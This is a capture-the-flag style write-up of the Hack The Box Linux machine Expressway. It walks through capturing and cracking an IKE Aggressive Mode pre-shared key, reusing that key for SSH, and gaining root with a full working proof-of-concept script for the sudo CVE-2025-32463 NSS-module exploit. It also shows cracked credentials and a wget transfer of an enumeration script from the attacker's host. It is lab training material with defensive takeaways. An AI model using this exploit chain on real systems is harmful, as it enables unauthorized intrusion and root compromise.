# Expressway: Hack The Box Writeup

**Machine:** Expressway  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** December 2025  

---

## Summary

Expressway is an easy Linux machine centred around an exposed IKE/IPSec VPN service. Reconnaissance reveals only SSH on TCP and IKE on UDP 500, with TFTP as a dead end. Running ike-scan in Aggressive Mode leaks the server's identity (`ike@expressway.htb`) and captures a crackable PSK hash. Cracking it with psk-crack yields the pre-shared key, which doubles as the SSH password for the `ike` user. Privilege escalation is achieved by exploiting CVE-2025-32463, a local privilege escalation vulnerability in sudo 1.9.17 that allows an unprivileged user to load a malicious NSS module via the `-R` flag, spawning a root shell.

**Key techniques:** UDP service enumeration · IKE/IPSec fingerprinting · Aggressive Mode PSK hash capture · PSK cracking · Credential reuse · CVE-2025-32463 (sudo LPE)

---

## Reconnaissance

Full TCP port scan:

```bash
sudo nmap -sV -sC -p- -T5 10.129.9.146
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

Only SSH on TCP. A single open port is a strong signal to check UDP.

```bash
sudo nmap -sU -F 10.129.9.146
```

**Results:**

```
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

Much more interesting. UDP 500 (`isakmp`) and 4500 (`nat-t-ike`) indicate an IKE/IPSec VPN service: the main attack surface. TFTP on 69 is worth noting. Deeper scan on the UDP ports:

```bash
sudo nmap -sC -sU -p68,69,500,4500 10.129.9.146
```

**Results:**

```
PORT     STATE         SERVICE
69/udp   open          tftp
500/udp  open          isakmp
| ike-version:
|   attributes:
|     XAUTH
|_    Dead Peer Detection v1.0
```

The IKE service uses **PSK (pre-shared key) authentication** with **XAUTH** (Extended Authentication: a username/password layer on top of the PSK). This is the path forward.

---

## Enumeration

### TFTP: Dead End

```bash
tftp 10.129.9.146 69
tftp> status
# Connected to 10.129.9.146: no files accessible
```

Nothing useful. Moving on.

### IKE Fingerprinting

Starting with a Main Mode scan to confirm the service and enumerate supported transforms:

```bash
ike-scan -M 10.129.9.146
```

```
10.129.9.146    Main Mode Handshake returned
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

Checking the backoff pattern to fingerprint the implementation:

```bash
ike-scan -M --showbackoff 10.129.9.146
```

```
Implementation guess: Linksys Etherfast
```

### Aggressive Mode: Identity Leak and PSK Hash Capture

IKE has two negotiation modes: Main Mode (identity protected) and Aggressive Mode (identity sent in cleartext, faster). Aggressive Mode is significantly weaker: if the server supports it, it will respond to any client ID and leak the server's own identity, and the PSK hash can be captured offline.

Testing Aggressive Mode with a dummy group name:

```bash
ike-scan 10.129.9.146 -M -A --id=groupnamedoesnotexist -P
```

The server responds with a full handshake and leaks its own identity:

```
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
```

The server identity is `ike@expressway.htb`. Now re-running with the correct ID to capture the PSK hash in a file:

```bash
sudo ike-scan 10.129.9.146 -M -A --id=ike@expressway.htb -P hashfile
```

The `-P hashfile` flag writes the IKE PSK parameters directly to disk in the format psk-crack expects: no manual copying required.

---

## PSK Cracking

`psk-crack` is the purpose-built tool for IKE PSK hashes, included with the ike-scan package:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hashfile
```

```
key "freakingrockstarontheroad" matches SHA1 hash 2cd2160d3849b804fe521e2cbefb0f1b1937679d
```

PSK cracked: **`freakingrockstarontheroad`**

---

## Initial Access: Credential Reuse

The PSK is the VPN pre-shared key, but it's worth testing it as an SSH password for the `ike` user (the identity leaked by the server):

```bash
ssh ike@10.129.9.146
# Password: freakingrockstarontheroad
# Login successful
```

Credential reuse gives direct SSH access.

```bash
cat user.txt
# adb98befe6947e25c3cd788dc5020e21
```

---

## Privilege Escalation: CVE-2025-32463

### Enumeration

```bash
sudo -l
# Sorry, user ike may not run sudo on expressway
```

No sudo rights. Transferring LinPEAS for automated enumeration:

**On attack machine:**
```bash
python3 -m http.server 8000
```

**On target:**
```bash
wget http://10.10.15.12:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS flags two interesting findings:

```
Sudo version 1.9.17
```

```
-rwsr-xr-x 1 root root 1023K Aug 29 2025 /usr/local/bin/sudo  ---> check_if_the_sudo_version_is_vulnerable
```

There are two sudo binaries: `/usr/local/bin/sudo` (1023K, August 2025) and `/usr/bin/sudo` (276K, June 2023). The newer one in `/usr/local/bin/` is the one actually running. Sudo 1.9.17 is vulnerable to **CVE-2025-32463**.

### CVE-2025-32463

CVE-2025-32463 is a local privilege escalation in sudo's `-R` (chroot) flag. When sudo is invoked with `-R <dir>`, it changes root to the specified directory before executing the command. Because sudo reads NSS (Name Service Switch) configuration from the chroot'd `/etc/nsswitch.conf`, an attacker can supply a custom `nsswitch.conf` pointing to a malicious shared library. That library runs as root during sudo's own privilege escalation process, spawning a root shell before the target command ever executes.

### Exploitation

Using the PoC from [CVE-2025-32463-POC](https://github.com/K1tt3h/CVE-2025-32463-POC):

```bash
vi exploit.sh
```

```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudostage.XXXX)
cd "$STAGE"

cat > xd1337.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void xd1337(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p xd/etc libnss_
echo "passwd: /xd1337" > xd/etc/nsswitch.conf
cp /etc/group xd/etc/

gcc -shared -fPIC -Wl,-init,xd1337 -o libnss_/xd1337.so.2 xd1337.c

sudo -R xd /bin/true
```

```bash
chmod +x exploit.sh
./exploit.sh
```

```
root@expressway:/# whoami
root
```

```bash
cat /root/root.txt
# 93381a165bb9dc8828ae1bf8f9fdfe24
```

---

<!-- Completion Image Here -->
<img width="1193" height="682" alt="Screenshot 2026-04-24 151608" src="https://github.com/user-attachments/assets/e54a340c-7c51-474b-a7d3-b9efc90c7256" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| IKE Aggressive Mode enabled | UDP 500 | Server identity leaked, PSK hash captured offline |
| Weak PSK | IKE configuration | PSK cracked via dictionary attack in seconds |
| Credential reuse | PSK → SSH | Direct shell access as `ike` via cracked PSK |
| CVE-2025-32463 (sudo LPE) | sudo 1.9.17 `/usr/local/bin/sudo` | Full root via malicious NSS module in sudo chroot |

---

## Key Takeaways

- **Always scan UDP**: this machine has almost no TCP attack surface; the entire foothold lives on UDP 500. Skipping UDP scans means missing the machine entirely
- **IKE Aggressive Mode is a serious misconfiguration**: it leaks the server identity and hands the attacker a crackable PSK hash. Main Mode should be enforced, and VPN gateways should be hardened against this
- **PSK strength matters**: the PSK was in rockyou.txt. A strong, random PSK prevents offline cracking even if Aggressive Mode is exposed
- **Credential reuse is always worth testing**: the VPN PSK becoming the SSH password is exactly the kind of shortcut that gets systems compromised
- **Two sudo binaries is a red flag**: the newer `/usr/local/bin/sudo` taking precedence over the system binary suggests a deliberate (or negligent) installation of a vulnerable version. Always check which binary actually runs with `which sudo`
- **LinPEAS version flags are meaningful**: the `check_if_the_sudo_version_is_vulnerable` annotation is a direct pointer; always research flagged sudo versions immediately

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
